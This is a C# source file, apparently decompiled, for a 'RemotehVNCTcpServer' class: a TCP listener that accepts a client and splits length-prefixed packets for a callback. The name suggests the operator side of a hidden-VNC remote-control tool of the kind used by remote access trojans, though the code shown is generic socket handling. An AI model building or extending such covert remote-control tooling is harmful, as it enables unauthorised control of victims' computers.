using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Sockets
{
	public class RemotehVNCTcpServer
	{
		public TcpListener _listener;

		public TcpClient _tcpClient;

		private NetworkStream _netstream;

		public List<byte> _HeadAndPayloadPacket = new List<byte>();

		private int _HeadPacketSize = 4;

		public Action<byte[]> _ClientMessage;

		public IPEndPoint _ListenedEndPoint { get; private set; }

		public RemotehVNCTcpServer(int _listport)
		{
			this._ListenedEndPoint = new IPEndPoint(IPAddress.Any, _listport);
		}

		[DllImport("ntdll.dll")]
		private static extern uint RtlCompressBuffer(ushort CompressionFormat, byte[] SourceBuffer, int SourceBufferLength, byte[] DestinationBuffer, int DestinationBufferLength, uint Unknown, out int pDestinationSize, IntPtr WorkspaceBuffer);

		[DllImport("ntdll.dll")]
		private static extern uint RtlDecompressBuffer(ushort CompressionFormat, byte[] SourceBuffer, int SourceBufferLength, byte[] DestinationBuffer, int DestinationBufferLength, out int pDestinationSize);

		public void Listen()
		{
			try
			{
				this._listener = new TcpListener(this._ListenedEndPoint);
				this._listener.Start();
				Task.Factory.StartNew((Func<Task>)async delegate
				{
					await this.Accept();
				}, TaskCreationOptions.None);
			}
			catch
			{
				MessageBox.Show("Listen error");
			}
		}

		private async Task Accept()
		{
			RemotehVNCTcpServer desktopTcpServer = this;
			try
			{
				desktopTcpServer._tcpClient = await desktopTcpServer._listener.AcceptTcpClientAsync();
				await Task.Factory.StartNew(new Func<Task>(desktopTcpServer.AsyncClientRecv), TaskCreationOptions.None);
			}
			catch
			{
			}
		}

		public async Task AsyncClientRecv()
		{
			try
			{
				this._netstream = this._tcpClient.GetStream();
				while (this._tcpClient.Connected)
				{
					byte[] _readbyte = new byte[15000];
					int num = await this._netstream.ReadAsync(_readbyte, 0, 15000);
					if (num == 0)
					{
						throw new Exception();
					}
					byte[] array = new byte[num];
					Buffer.BlockCopy(_readbyte, 0, array, 0, num);
					this._HeadAndPayloadPacket.AddRange(array);
					this.SplitPacket();
				}
			}
			catch
			{
				this.Close();
			}
		}

		private void SplitPacket()
		{
			try
			{
				if (this._HeadAndPayloadPacket == null || this._tcpClient == null || this._HeadAndPayloadPacket.Count < this._HeadPacketSize)
				{
					return;
				}
				int num = BitConverter.ToInt32(this._HeadAndPayloadPacket.GetRange(0, this._HeadPacketSize).ToArray(), 0);
				if (this._HeadAndPayloadPacket.Count - this._HeadPacketSize >= num)
				{
					if (this._HeadAndPayloadPacket.Count - this._HeadPacketSize > num)
					{
						this._ClientMessage(this._HeadAndPayloadPacket.GetRange(this._HeadPacketSize, num).ToArray());
						this._HeadAndPayloadPacket.RemoveRange(0, num + this._HeadPacketSize);
						this.SplitPacket();
					}
					if (this._HeadAndPayloadPacket.Count - this._HeadPacketSize == num)
					{
						this._ClientMessage(this._HeadAndPayloadPacket.GetRange(this._HeadPacketSize, num).ToArray());
						this._HeadAndPayloadPacket.Clear();
					}
				}
			}
			catch
			{
				this._HeadAndPayloadPacket.Clear();
			}
		}

		public void Close()
		{
			try
			{
				this._listener?.Stop();
				this._tcpClient?.Client.Shutdown(SocketShutdown.Both);
				this._netstream?.Dispose();
				this._tcpClient?.Close();
				this._tcpClient?.Dispose();
				this._HeadAndPayloadPacket?.Clear();
			}
			catch
			{
			}
			finally
			{
				this._netstream = null;
				this._tcpClient = null;
				this._HeadAndPayloadPacket = null;
				this._listener = null;
			}
		}
	}
}
